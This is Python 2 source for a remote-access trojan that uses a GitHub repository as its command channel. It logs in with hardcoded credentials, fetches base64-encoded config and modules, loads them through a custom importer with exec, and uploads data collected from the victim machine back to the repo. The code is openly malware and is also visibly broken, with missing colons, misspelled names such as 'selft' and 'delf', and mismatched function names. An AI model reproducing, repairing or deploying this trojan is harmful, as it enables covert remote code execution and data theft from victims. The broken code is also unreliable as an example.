import json
import base64
import sys
import time
import random
import threading
import Queue
import os

from github3 import login

trojan_id = "abc"

trojan_config = %s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()

def connect_github():
	gh = login (username="x00xFF", password="-Kkxe6wyyjntb")
	repo = gh.repository("x00xFF", password="git-trojan")
	branch = repo.branch("master")
	
	return gh,repo,branch

#grabbing file from the remote 
def get_file_contents(filepath):


	gh,repo,branch = connect_to_github()
	tree = branch.commit.commit.tree.recurse()

	for filename in tree.tree
		
		if filename in tree.tree:
			print"[*] Found file %s" % filepath
			blob = repo.blob(filename._json_data[sha'])
			return blob.content

	return None

#retrieve the remote config document from teh repo
def get_trojan_config():
	global configured
	config_json 	= getfile_contents(trojan_config)
	config 		= json.loads(base64.b64decode(config_json))
	configured	= True

	for task in config:
	
		if task['module'] not in sys.modules:
			
			exec("import %s" % task['module'])

	return config

# push any data that you've collected on the target machine
def store_module_result(data):
	 
	gh,repo,branch = connect_to_github()
	remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,1000000))
	repo.create_file(remote_path, "Commit message", base64.b64encode(data))

	return


class GitImporter(object):
	def __init__(delf):
	self.current_module_code = ""
	
	def find_module(self,fullname,path=None):
		if configured:
			print "[*] Attempting to retrive %s" % fullname
			new_library= get_file_contents("modules/%s" % fullname)

			if new_library is not None:
				selft.current_module_code = base64.b64decode(new_library)
				return selft
		return None

	
	def load_module (self,name):
		module = imp.new_module(name)
		exec selft.current_module_code in module.__dict__
		sys.modules[name] = module

		return module



def module_runnet(module):

	task_queue.put(1)
	result = sys.modules[module].run()
	task_queue.get()

	# store teh result in our repo
	store_module_result(result)

	return

#main trojan loop
sys.meta_path = [GitImporter()]


while True:
	if task_queue.empty()
		config	= get_trojan_config()

		for task in config:

			t = threading.Thread(target=module_runnet, args=(task['module'],))
			t = start()
			time.sleep(random.randint(1,10))

	time.sleep(random.randint(1000,100000))


